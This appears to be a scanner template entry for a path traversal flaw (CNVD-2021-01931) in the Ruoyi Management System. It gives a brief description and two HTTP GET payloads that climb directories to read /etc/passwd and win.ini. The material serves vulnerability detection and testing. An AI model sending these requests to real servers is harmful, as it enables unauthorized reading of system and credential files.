# Nuclei Template: Ruoyi Management System - Local File Inclusion
**Template ID:** CNVD-2021-01931
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`CNVD-2021-01931.yaml`)

## Vulnerability Information & PoC

## Description
The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd
GET {{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini
```
